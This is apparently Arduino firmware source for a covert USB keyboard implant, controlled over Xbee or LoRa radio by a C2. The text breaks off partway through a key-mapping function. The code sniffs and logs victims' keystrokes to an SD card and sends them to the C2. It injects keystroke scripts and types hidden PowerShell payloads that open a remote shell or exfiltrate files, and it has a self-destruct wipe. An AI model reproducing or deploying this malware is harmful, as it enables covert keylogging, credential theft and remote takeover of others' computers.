/*
 * Receive ASCII text from Serial1 and convert to USB HID report.
 * Send HID report out USB interface.
 * Maps out keystrokes and sends out data over ble when a central device is connected
 *
 * Using Serial 1 for now as interface with Xbee. This may change in the future
 * mySerial is a custom serial line added to handle incoming data from Trinket M0/keyboard
 * 
 *Copyright 2022 Jonathan Fischer and Jeremy Miller
 *Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 *The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 *THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#include <Arduino.h>
#include <wiring_private.h>
#include <Keyboard.h>
#include <Mouse.h>
#include <SPI.h>
#include <SD.h>

Uart mySerial (&sercom0, 5, 6, SERCOM_RX_PAD_1, UART_TX_PAD_0);

// Attach the interrupt handler to the SERCOM
void SERCOM0_Handler()
{
    mySerial.IrqHandler();
}

//File myFile;
String scriptName = "deleteMe.txt";
String recordName = "deleteMe2.txt";

//timer variables
unsigned long startMillis;
unsigned long currentMillis;
unsigned long elapsedMillis;

//password variables
// these must match what is in ihide.py or your devices will not communicate
// default values have been added below for out-of-the-box functionality
// WARNING: if you do not change these variables, an attacker can potentially detect and hijack your implant

String activatePW = "DEFAULTactivatePW";            //password for activating implant functions                             - main menu option 3
String getModesPW = "DEFAULTgetModesPW";            //password for retrieving the status of insomnia and key recorder modes - main menu option 4
String recKeysEnablePW = "DEFAULTrecKeysEnablePW";  //password for enabling keystroke recording                             - main menu option 8
String recKeysDisablePW = "DEFAULTrecKeysDisablePW";//password for disabling keystroke recording                            - main menu option 9
String txKeysPW = "DEFAULTtxKeysPW";                //password for sniffing keystrokes                                      - main menu option 5
String disableKeyTxPW = "DEFAULTdisableKeyTxPW";    //password for disabling sniffing keystrokes                            - main menu option 5
String insomniaPW = "DEFAULTinsomniaPW";            //password for enabling insomnia mode                                   - main menu option 6
String allowSleepPW = "DEFAULTallowSleepPW";        //password for disabling insomnia mode                                  - main menu option 7
String goDarkPW = "DEFAULTgoDarkPW";                //password for wiping SD card - go dark mode                            - main menu option 11
String injectPW = "DEFAULTinjectPW";                //password to enable key injection, run script from SD                  - main menu option 15
String rxScriptPW = "DEFAULTrxScriptPW";            //password to transfer an attack script from C2 to SD                   - main menu option 16
String resetPW = "DEFAULTresetPW";                  //password to reset all variables back to default                       - main menu option 19
String deletePW = "DEFAULTdeletePW";                //password to delete a file on the SD card of a target implant          - main menu option 18
String sendKeysPW = "DEFAULTsendKeysPW";            //password for downloading keystroke recording file from SD to C2       - main menu option 10
String printFilesPW = "DEFAULTprintFilesPW";        //password to print a list of the files on the SD card                  - main menu option 12
String terminalPW = "DEFAULTterminalPW";            //password for starting a remote powershell terminal on windows victim  - main menu option 17 
String terminalPWOFF = "DEFAULTterminalPWOFF";      //password for ending a remote powershell terminal on windows victim    - main menu option 17
String exfilPW = "DEFAULTexfilPW";                  //password for copying files from a windows victim to the C2            - main menu option 13
String exfilPWOFF = "DEFAULTexfilPWOFF";            //password for ending copying files from a windows victim to the C2     - main menu option 13
String exfilPWSD = "DEFAULTexfilPWSD";              //password for copying files from a windows victim to the SD Card       - main menu option 14
String shellPW = "DEFAULTshellPW";                  //password for hardcoded PS COM Shell script injection                  - main menu option ??

//LoRa variables
bool setLoRa = false;
int loraTargetID = 1;

//Toggle variables
bool activate = false; // allow outgoing communication with C2 but do not accept commands until activated via C2 menu with the proper password
bool txKeys = false;   // do not sniff keystrokes until activated
bool insomnia = false; // default to insomnia mode off until activated
bool record = false;   // do not record keystrokes to SD card until activated
bool keyinject = false; 
bool exfil = false;
bool rxScript = false;
bool rxScriptName = false;
bool fileName = false;
bool deleteScript = false;
bool sendKeyFile = false;
bool terminalMode = false;
bool exfilMode = false;
bool exfilStartVar = false;
bool exfilModeSD = false;
bool exfilStartVarSD = false;
String stringOne = "";
String incoming = "";
String incoming1 = "";
String incoming2 = "";
bool startexfil = false;
char aLine[81];
byte oldKeys[81]  = {0,0,0,0,0,0,0,0};
byte newKeys[81] = {0,0,0,0,0,0,0,0};
byte oldKeys_Count = 8;
byte newKeys_Count = 0;
uint8_t aLine_count = 0;

void setup(){
  // Reassign pins 5 and 6 to SERCOM alt
pinPeripheral(5, PIO_SERCOM_ALT); //Rx
pinPeripheral(6, PIO_SERCOM_ALT); //Tx

Serial.begin(115200);
Serial1.begin(115200);
mySerial.begin(115200);
aLine_count = 0;

Serial.print("Initializing SD card...");
if (!SD.begin(4)) {
  Serial.println("initialization failed!");
  while (1);
  }
Serial.println("initialization done.");
}

uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
{
  char *p;
  uint8_t outbuf_count = 0;

  memset(outbuf, 0, outbuf_len);
  p = strtok(buf, ",");
  while (p != NULL && outbuf_count < outbuf_len) {
    *outbuf++ = strtoul(p, NULL, 10);
    outbuf_count++;
    p = strtok(NULL, ",");
  }
  return outbuf_count;
}

void loop() {   
    // if terminalMode is active, invoke a powershell terminal via com port and connect it to the C2
    if (terminalMode) {
        if (Serial.available() > 0) {
        incoming1 = Serial.readString();
        txData(incoming1);
        Serial1.flush();
        delay(2000);
        
      }
    }
    
    if (exfilMode) {
        exfilStartVar = false;
        if (Serial.available() > 0) {
        incoming1 = Serial.readString();
        txData(incoming1);        
      }
    }
    
    if (exfilModeSD) {
        exfilStartVarSD = false;
        if (Serial.available() > 0) {
        
        incoming1 = Serial.readString();
        stringOne += incoming1;
        if (incoming1 == "~<<<EOF>>>") {
         //Save to SD
         saveExfilSD("test.txt",stringOne); 
        }   
      }
    }
    
#ifdef Serial
  if (Serial.available() > 0) {
    char c = Serial.read();
    mySerial.write(c);
  }
#endif

  if (mySerial.available() > 0) {
    char c = mySerial.read();
#ifdef Serial
#endif
    if (c == '\n' || aLine_count >= sizeof(aLine)) {
      aLine[aLine_count] = '\0';
#ifdef Serial
      if (record){
        recordKeys(aLine);
      }
      Serial.println(aLine);
#endif
      char command = aLine[0];
      uint8_t rawdata[8];
      uint8_t raw_len = params2bin(aLine+2, rawdata, sizeof(rawdata));
      aLine_count = 0;
      String message = "";
      if (raw_len > 0) {
        switch (command) {
          // Keyboard HID report
          case 'K':
          case 'k':
            startMillis = millis(); //set start of timer
            currentMillis = millis(); //reset current timer to equal start timer
            elapsedMillis = 0;
            if (raw_len != 8) break;
            if (rawdata[2] == 0){
              //if there is no key press regardless of modifiers, reset oldKeys array
              for (byte i = 0; i < oldKeys_Count; i++){
                oldKeys[i] = 0;
              }
            }
            if (rawdata[0] != 0) { //modifier pressed
              if (rawdata[0] != oldKeys[0]){
                //if modifier is different than last packet
                newKeys[0] = rawdata[0];
              }
            } else {
              newKeys[0] = 0;
            }
            newKeys_Count = 1; //counter for iteration to bypass mod byte
            for (byte i = 2; i < 8; i++){
              if (rawdata[i] > 0){
                byte input = rawdata[i];
                bool keyFound = false;
                //check to see if keypress was present in last recoreded key press
                for (byte k = 1; k < oldKeys_Count; k++){
                  if (oldKeys[k] = input){
                    Serial.print(oldKeys[k]); Serial.println(" is in the array");
                    keyFound = true;
                  } 
                }
                if (!keyFound) {
                  newKeys[newKeys_Count] = rawdata[i];
                  newKeys_Count++;
                }
              }
            }
            oldKeys_Count = newKeys_Count;
            for (byte i = 0; i < newKeys_Count; i++){
              oldKeys[i] = newKeys[i];
            }
            if (txKeys){
              // sniffing keystrokes is enabled, transmit back to the C2 and count each key press
              txKeyPresses(newKeys, newKeys_Count);
            }
            HID().SendReport(2, rawdata, sizeof(KeyReport));
            break;
            // Mouse HID report
          case 'M':
          case 'm':
            if (raw_len != 4) break;
            HID().SendReport(1, rawdata, 4);
            break;
          default:
            break;
        }
      }
    }
    else {
      aLine[aLine_count++] = c;
    }
  }

  
  //rx incoming from xbee
  if (Serial1.available()) {
    incoming = rxData(Serial1.readString());
    Serial.println(incoming);
    // if activate == false, the implant will ignore all commands until the matching activatePW is provided
    if (activate) {
      //only allow functionality if activated by C2
      setMode(incoming);
    } else if (incoming == activatePW) {
      // if activatePW matches, set activate to true and begin interactive mode
      activate = true;
      Serial.println("Activate is set true");
    }
  }
  // if insomnia mode is activated, move the mouse one pixel, then move it back one pixel so the mouse does not drift over time
  if (insomnia) {
    Mouse.begin();
    Mouse.move(1, 0);
    Mouse.move(-1,0);
    Mouse.end();
  }
}


void setMode(String pass){
  if (pass == resetPW){
    Serial.println("Reset mode enabled");
    reset();
  }else if (sendKeyFile){
    Serial.print("Receiving in key file name to send: ");
    Serial.println(pass);
    recordName = pass; 
    Serial.println("Sending key record data");
    sendKeyRecord(recordName); 
    sendKeyFile = false;
    Serial.print("Exiting key file transfer: ");
    Serial.println(sendKeyFile);   
  }else if (deleteScript) {
    Serial.println("deleteScript is set to true");
    Serial.print("File path for file to delete is: ");
    Serial.println(pass);
    SD.remove(pass);
    Serial.println("File removed");
    //txData("File removed\r\n");
    deleteScript = false;
  }else if (keyinject == true) {
    Serial.println("Key Inject is set to true");
    Serial.print("File name is: ");
    Serial.println(pass);
    launchScript(pass);
    keyinject = false;
  }else if (exfil == true){
    Serial.println("Exfil is set to true");
    //exfilFunction(incoming);
    exfil = false;
  }else if (rxScript == true){
    Serial.println("Receiving in script data");
    saveScript(scriptName, pass);
  }else if (rxScriptName == true){
    Serial.print("Receiving in script name: ");
    Serial.println(pass);
    scriptName = pass;
    rxScript = true;
    rxScriptName = false;
  }else if (pass == getModesPW) {
    getModes();
  }else if (pass == recKeysEnablePW){
    // set record to true to enable keystroke recording mode and write captured keystrokes to a txt file on the SD card
    Serial.println("Record Keys Enabled");
    record = true;
  }else if (pass == recKeysDisablePW){
    // set record to false to disable keystroke recording mode
    Serial.println("Record Keys Disabled");
    record = false;
  }else if (pass == txKeysPW){
    // set txKeys to true to enable keystroke sniffing and transmitting of live key presses back to the C2
    Serial.println("Transmit Keys Enabled");
    txKeys = true;
  }else if (pass == disableKeyTxPW){
    // set txKeys to false to disable keystroke sniffing and transmitting of live key presses back to the C2
    Serial.println("Transmit Keys Disabled");
    txKeys = false;
  }else if (pass == insomniaPW){
    // set insomnia to true to enable insomnia mode where the mouse if moved periodically to prevent screen saver
    Serial.println("Insomnia Enabled");
    insomnia = true;
  }else if (pass == allowSleepPW){
    // set insomnia to false to disable insomnia mode
    Serial.println("Insomnia Disabled");
    insomnia = false;
  }else if (pass == goDarkPW){
    // self destruct mode resets all variables to default values and wipes the SD card
    Serial.println("Wipe card and go into dark mode");
    reset();
    getWipe();
  }else if (pass == injectPW){
    Serial.println("Inject keystrokes enabled");
    File root = SD.open("/SCRIPTS/");
    String rootDir = "/";
    printScripts(root, rootDir);
    if (setLoRa){
      txData("<<<End of Message>>>");
    } else {
      txData("<<<End of Message>>>\r\n");
    }
    Serial1.flush();
    keyinject = true;

  }else if (pass == rxScriptPW){
    // initiate receiving a file from the C2 to write locally to the SD card for later execution on the victim machine
    Serial.println("Receive Script enabled");
    rxScriptName = true;
  }else if (pass == deletePW){
    // delete a file from the SD card
    Serial.println("Deleting File mode enabled");
    File root = SD.open("/");
    String rootDir = "/";
    printScripts(root, rootDir);
    if (setLoRa){
      txData("<<<End of Message>>>");
    } else {
      txData("<<<End of Message>>>\r\n");
    }
    Serial1.flush();
    deleteScript = true; 
  }else if (pass == sendKeysPW){
    // send the keys.txt file of recorded keystrokes from the SD card to the C2
    Serial.println("Send key recording data from SD to C2 Enabled");
    File root = SD.open("/Data/");
    String rootDir = "/";
    printScripts(root, rootDir);
    if (setLoRa){
      txData("<<<End of Message>>>");
    } else {
      txData("<<<End of Message>>>\r\n");
    }
    Serial1.flush();
    sendKeyFile = true;
  }else if (pass == printFilesPW){
    // get a list of the files on the SD card and send it back to the C2
    Serial.println("Send list of SD card contents");
    File root = SD.open("/");
    String rootDir = "/";
    printScripts(root, rootDir);
    if (setLoRa){
      txData("<<<End of Message>>>");
    } else {
      txData("<<<End of Message>>>\r\n");
    }
    Serial1.flush();
  }
   
   else if (pass == terminalPW){
    // set terminalMode to true to initiate a remote powershell terminal on a windows victim
    Serial.println("TERMINAL");
    terminalMode = true;
    if (setLoRa){
      txData("<<<End of Message>>>");
    } else {
      txData("<<<End of Message>>>\r\n");
    }
    Serial1.flush();
    }

   else if (pass == terminalPWOFF){
    // exit gracefully from remote terminal mode if the function crashes or user CTRL+C
    Serial.println("TERMINAL OFF");
    terminalMode = false;
    Serial1.flush();
    }
     else if (pass == exfilPW){
    // launch a powershell script that allows remote file browsing and exfil to C2 of files on a windows victim
    Serial.println("EXFIL ON");
    exfilStartVar = true;
    Serial1.flush();
    }
    else if (exfilStartVar == true) {
      exfilStartVar = false;
      exfilStart(pass);
      Serial1.flush();
      }
        else if (pass == exfilPWSD){
    // launch a powershell script that allows remote file browsing and exfil to C2 of files on a windows victim
    Serial.println("EXFIL SD ON");
    exfilStartVarSD = true;
    Serial1.flush();
    }
       else if (exfilStartVarSD == true) {
      exfilStartVarSD = false;
      exfilStartSD(pass);
      Serial1.flush();
      }
    
   else if (pass == exfilPWOFF){
    // exit gracefully from exfil mode if the function crashes or the user CTRL+C
    Serial.println("EXFIL OFF");
    exfilMode = false;
    exfilStartVar = false;
    Serial1.flush();
    }
   else if (pass == shellPW){
    shellStart();
   }
 
}

//
// getWipe() is called during self destruct mode and calls wipeCard() to wipe the SD card
//
void getWipe(){
  File root = SD.open("/");
  String rootDir = "/";
  wipeCard(root, "/");
}

//
// wipeCard() is called during self destruct mode and deletes all files and directories on the SD card
//
void wipeCard(File dir, String d) {
  while (true) {
    String dirname = d;
    File entry =  dir.openNextFile();
    if (! entry) {
      // no more files
      break;
    }
    String filename = entry.name();
    if (entry.isDirectory()) {
      dirname.concat(entry.name());
      dirname.concat("/");
      wipeCard(entry, dirname);
      SD.rmdir(dirname);
    } else {
      // files have sizes, directories do not
      dirname.concat(entry.name());
      SD.remove(dirname);
    }
    entry.close();
  }
}

void exfilStart(String n) {
exfilStartVar = false;
inject("ps-LEFT_GUI");
inject("dl-250");
inject("ra-");
inject("dl-1000");
inject("pt-powershell.exe");
inject("dl-250");
inject("ps-RETURN");
inject("ra-");
inject("dl-2000");
  String exfilHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_046D&PID_C31C&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
  inject(exfilHide);
  delay(1000);
  inject("ps-RETURN");
  inject(exfilCode);
  delay(5000);
  inject("dl-250");
  inject("ps-RETURN");
  inject("ra-");
  inject("ps-RETURN");
  inject("ra-");
  exfilStartVar = false;
  exfilMode = true;
  Serial1.flush();
}

void shellStart() {
inject("dl-500");
inject("ps-LEFT_GUI");
inject("dl-250");
inject("ra-");
inject("dl-1000");
inject("pt-powershell.exe");
inject("dl-250");
inject("ps-RETURN");
inject("ra-");
inject("dl-500");
  String shellHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
  String shellCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_046D&PID_C31C&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();while($port.IsOpen){$data = $port.ReadExisting();$datareal = $datareal + $data;if ($datareal -Match \"<<ENDD>>\") {$datareal = $datareal.Replace(\"<<ENDD>>\",\"\");$sendback = (iex $datareal 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$port.WriteLine(\"~\"+$sendback2);$datareal = \"\";$data = \"\"};Hide-Console};";
  inject(shellHide);
  delay(1000);
  inject("ps-RETURN");
  inject(shellCode);
  delay(1000);
  inject("dl-500");
  inject("ps-RETURN");
  inject("ra-");
  inject("ps-RETURN");
  inject("ra-");
  Serial1.flush();
}

void exfilStartSD (String n) {
exfilStartVarSD = false;
inject("ps-LEFT_GUI");
inject("dl-250");
inject("ra-");
inject("dl-1000");
inject("pt-powershell.exe");
inject("dl-250");
inject("ps-RETURN");
inject("ra-");
inject("dl-1000");
  String exfilHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_046D&PID_C31C&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
  inject(exfilHide);
  delay(1000);
  inject("ps-RETURN");
  inject(exfilCode);
  delay(5000);
  inject("dl-250");
  inject("ps-RETURN");
  inject("ra-");
  exfilModeSD = true;
  inject("ps-RETURN");
  inject("ra-");
  exfilStartVarSD = false;
  Serial1.flush();

}


//
// recordKeys() writes recorded keystrokes to SDCard/Data/keys.txt when keystroke recording is enabled
//
void recordKeys(String d){
  if (SD.exists("/Data/") == false){
    SD.mkdir("/Data/");
  }
  String path = "/Data/keys.txt";
  File keyFile = SD.open(path, FILE_WRITE);
  if (keyFile) {
    keyFile.println(d);
    Serial.println("Printing data to file");
  }
  keyFile.close();
}


void sendKeyRecord(String n){
  String path = "/Data/" + n;
  File myFile = SD.open(path);
  String line = "";
  Serial.print("Opening path: ");
  Serial.println(path);
  if (myFile){
    Serial.println("File Exists");
    while (myFile.available()){
      char data = myFile.read();
      if (data == '\n' or data == '\r'){ //detect end of line and stop populating string variable
        if (setLoRa==false){
          line.concat(data); 
        }
        Serial.print("Sending line: ");
        Serial.println(line);
        txData(line);
        Serial1.flush();
        delay(50);
        line = "";
      } else {
        line.concat(data);
      }      
    }
  }
  if (setLoRa==false) {
    txData("<<<EOF>>>\r\n");
  } else {
    txData("<<<EOF>>>");
  }
}

void printScripts(File dir, String d){
  Serial.println("Entering printScripts method");
  while (true) {
    String dirname = d;
    File entry = dir.openNextFile();
    if (!entry) {
      //no more lines
      break;
    }
    String filename = entry.name();
    if (entry.isDirectory()) {
      dirname.concat(entry.name());
      dirname.concat("/");
      printScripts(entry, dirname);
    } else {
      dirname.concat(entry.name());
      Serial.print("Script found: ");
      Serial.println(dirname);
      if (setLoRa){
        txData(dirname);
      } else {
        txData(dirname+"\r\n");
      }
      Serial1.flush();
      delay(200);
    }
    entry.close();
  }
  dir.close();
}

void launchScript(String n) {
/* Keystroke Injection/Attack Script layout
*ps-<Key> = Keyboard.press(<KEY>) or Keyboard.press('<char>') 
*pt-<String> = Keyboard.print("<String>")
*ra- = Keyboard.releaseAll();
*dl-<# of milliseconds> = delay(<# of milliseconds>)
*/
//exit function if script name is returned as <<<Abort>>>
//This indicates that no scripts were relayed to the C2
  if (n == "<<<Abort>>>"){
    Serial.println("Aborting key injection");
    return;
  }
  String path = "/Scripts/" + n;
  File myFile = SD.open(path);
  String line = "";
  Serial.print("Opening path: ");
  Serial.println(path);
  if (myFile){
    Serial.println("File Exists");
    while (myFile.available()){
      Serial.println("File opened successfully");
      //read in complete line from file and assign to a string variable
      char data = myFile.read();
      if (data == '\n' or data == '\r'){ //detect end of line and stop populating string variable
        if (line.length() > 1){ //don't send blank lines
          //send the line for injection mapping
          inject(line);
        }
        line = "";
      } else {
        line.concat(data);
      }
    }
    myFile.close();
    Serial.println("File was launched successfully");
    txData("File was launched successfully\r\n");
    Serial1.flush();
  } else {
    myFile.close();
    Serial.println("There was an error reading the submitted script name");
    txData("There was an error reading the submitted script name\r\n");
    Serial1.flush();
  }
}

void inject(String s){
  Keyboard.begin();
  int len = s.length();
  String command = s.substring(3,len);
  if (s.startsWith("ps")){
    //indicates Keyboard.press()
     // String cCommand = s.substring(3,len); 
      Keyboard.press(mapChars(command));
  }
  else if(s.startsWith("pt")){
  //indicates keyboard.print()
    Keyboard.print(command);
  } 
  else if(s.startsWith("r")){
    Keyboard.releaseAll();
  } 
  else if (s.startsWith("d")){
    delay(command.toInt());
  }
  else {
    Serial.println("There was an error with the script parsing.");
    Serial.println("Exiting Attack script.");
    Keyboard.end();
    return;
  }
  Keyboard.end();
  return;
}

//
// getModes() will return the current status of key recorder mode and insomnia mode
//
void getModes(){
  if (record){
    Serial.println("Key recorder mode: active");
    if (setLoRa){
      txData("Key recorder mode: active");
    } else {
      txData("Key recorder mode: active\r\n");
    }
  } else {
    Serial.println("Key recorder mode: deactivated");
    if (setLoRa){
      txData("Key recorder mode: deactivated");
    } else {
      txData("Key recorder mode: deactivated\r\n");
    }
  }

  if (insomnia){
    Serial.println("Insomnia mode: active");
    if (setLoRa){
      txData("Insomnia mode: active");
    } else {
      txData("Insomnia mode: active\r\n");
    }
  } else{
    Serial.println("Insomnia mode: deactived");
    if (setLoRa){
      txData("Insomnia mode: deactived");
    } else {
      txData("Insomnia mode: deactived\r\n");
    }
  }
  String timer = getTimer();
  Serial.println(timer);
  if (setLoRa){
    txData(timer);
  } else {
    txData(timer + "\r\n");
  }
  Serial1.flush();
  delay(100);
  if (setLoRa) {
    txData("<<<End of Message>>>");
  } else {
    txData("<<<End of Message>>>\r\n");
  }
}

//
// saveScript() writes a received script file to /SCRIPTS/ directory on the SD card
//
void saveScript(String n, String s){
  if (SD.exists("/SCRIPTS/") == false){
    SD.mkdir("/Scripts/");
  }
  String path = "/SCRIPTS/" + n;
  Serial.print("The file path is: ");
  Serial.println(path);
  if (s == "EOF"){
    rxScript = false;
  }
  else{
    File myFile = SD.open(path, FILE_WRITE);
    if (myFile) {
      myFile.println(s);
    }
    myFile.close();
  }
}

//
// saveExfilSD() writes a received exfil file to /EXFIL/ directory on the SD card
//

void saveExfilSD(String n, String s){
  //Serial.println("attempting exfil SD save");
  if (SD.exists("/EXFIL/") == false){
    SD.mkdir("/EXFIL/");
  }
  String path = "/EXFIL/" + n;
  Serial.print("The file path is: ");
  Serial.println(path);
  Serial.println(s);
    File myFile = SD.open(path, FILE_WRITE);
    if (myFile) {
      myFile.println(s);
    }
    myFile.close();
    exfilModeSD = false;
}

//
// reset() sets all variables to false to get out of any loop that it may be stuck in
// it is also called during self-destruct mode to reset all variables to default
//
void reset(){
activate = false; //allow outgoing communication with C2
txKeys = false;
insomnia = false;
record = false;
keyinject = false;
exfil = false;
rxScript = false;
rxScriptName = false;
fileName = false;
deleteScript = false;
sendKeyFile = false;
incoming = "";
}

char mapChars(String s){
  if (s == "LEFT_CTRL"){
    return 0x80;
  }
  else if (s == "LEFT_SHIFT"){
    return 0x81;
  }
  else if (s == "LEFT_ALT"){
    return 0x82;
  }
  else if (s == "LEFT_GUI"){
    return char(0x83);
  }
  else if (s == "RIGHT_CTRL"){
    return 0x84;
  }
  else if (s == "RIGHT_SHIFT"){
    return 0x85;
  }
  else if (s == "RIGHT_ALT"){
    return 0x86;
  }
  else if (s == "RIGHT_GUI"){
    return 0x87;
  }
  else if (s == "UP_ARROW"){
    return 0xDA;
  }
  else if (s == "DOWN_ARROW"){
    return 0xD9;
  }
  else if (s == "LEFT_ARROW"){
    return 0xD8;
  }
  else if (s == "RIGHT_ARROW"){
    return 0xD7;
  }
  else if (s == "BACKSPACE"){
    return 0xB2;
  }
  else if (s == "TAB"){
    return 0xB3;
  }
  else if (s == "RETURN"){
    return 0xB0;
  }
  else if (s == "ESC"){
    return 0xB1;
  }
  else if (s == "INSERT"){
    return 0xD1;
  }
  else if (s == "DELETE"){
    return 0xD4;
  }
  else if (s == "PAGE_UP"){
    return 0xD3;
  }
  else if (s == "PAGE_DOWN"){
    return 0xD6;
  }
  else if (s == "HOME"){
    return 0xD2;
  }
  else if (s == "END"){
    return 0xD5;
  }
  else if (s == "CAPS_LOCK"){
    return 0xC1;
  }
  else if (s == "F1"){
    return 0xC2;
  }
  else if (s == "F2"){
    return 0xC3;
  }
  else if (s == "F3"){
    return 0xC4;
  }
  else if (s == "F4"){
    return 0xC5;
  }
  else if (s == "F5"){
    return 0xC6;
  }
  else if (s == "F6"){
    return 0xC7;
  }
  else if (s == "F7"){
    return 0xC8;
  }
  else if (s == "F8"){
    return 0xC9;
  }
  else if (s == "F9"){
    return 0xCA;
  }
  else if (s == "F10"){
    return 0xCB;
  }
  else if (s == "F11"){
    return 0xCC;
  }
  else if (s == "F12"){
    return 0xCD;
  }
  else {
    int asize = s.length();
    char out[asize];
    s.toCharArray(out, asize);
    if (asize == 1){
      return out[0];
    } else {
      return 0x00;
    }
  }
}

String getMod (byte m){
  String output = "";
  if (m > 64){
    output.concat("RtAlt ");
    m = m - 64;
  }
  else if (m == 64){
    output.concat("RAlt");
    m = m - 64;
  }
  if (m == 34){
    //both shifts are pressed
    m = m - 34;
  }
  if (m > 32){
    //don't print if shift is only modifier pressed
    output.concat("RtShft ");
    m = m - 32;
  }
  else if (m == 32) {
    //output.concat("RtShft");
    m = m - 32;
  }
  if (m > 16) {
    output.concat("RtCtrl ");
    m = m - 16;
  }
  else if (m == 16){
    output.concat("RtCtrl");
    m = m - 16;
  }
  if (m > 8) {
    output.concat("LtGUI ");
    m = m - 8;
  }
  else if (m == 8) {
    output.concat("LtGUI");
    m = m - 8;
  }
  if (m > 4) {
    output.concat("LtAlt ");
    m = m - 4;
  }
  else if (m == 4) {
    output.concat("LtAlt");
    m = m -4;
  }
  if (m > 2) {
    output.concat("LtShft ");
    m = m - 2;
  }
  else if (m == 2) {
    //Don't print if shift is only modifier pressed
    m = m - 2;
  }
  if (m == 1) {
    output.concat("LtCtrl");
  }
  return output;
}

String getKeys(byte k){
//if shift is detected, 100 is added to k to map to Upper Case letters  
  switch (k){
    case 0:
      return String("");
